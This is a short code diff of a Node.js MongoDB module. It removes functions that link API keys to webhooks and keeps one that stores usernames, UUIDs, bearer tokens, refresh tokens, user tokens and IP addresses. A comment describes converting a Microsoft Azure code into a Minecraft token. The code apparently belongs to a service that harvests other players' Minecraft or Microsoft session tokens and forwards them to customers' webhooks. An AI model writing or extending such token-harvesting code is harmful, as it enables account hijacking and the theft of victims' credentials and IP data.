@@ -9,36 +9,6 @@ const client = new MongoClient(config.mongodb.connectionstring, {
   });
 
 //turn microsoft azure "code" into mincraft token with xbox live scope in a function that returns the value of uuid and baeer token
-
-
-
-  async function addUser(apikey, webhook) {
-    try {
-      await client.connect();
-      const database = client.db("users");
-      const collection = database.collection("users");
-      await collection.updateOne(
-        { apiKey: apikey },
-        { $set: { redirect: null, webhook: webhook } },
-        { upsert: true }
-      );
-    } catch (err) {
-      console.log(err.stack);
-    }
-  }
-
-  async function getWebhook(apikey) {
-    await client.connect();
-    try {
-      const database = client.db("users");
-      const collection = database.collection("users");
-      const result = await collection.findOne({ apiKey: `${apikey}` });
-      client.close();
-      return result.webhook;
-    } catch (err) {
-      console.log(err.stack);
-    }
-  }
   
   async function updateUser(username, uuid, BearerToken, refresh_token, ip, UserToken, randomkey) {
     try {
@@ -68,8 +38,5 @@ const client = new MongoClient(config.mongodb.connectionstring, {
 
   
   module.exports = {
-    createCollection,
-    addUser,
-    getWebhook,
     updateUser
   };
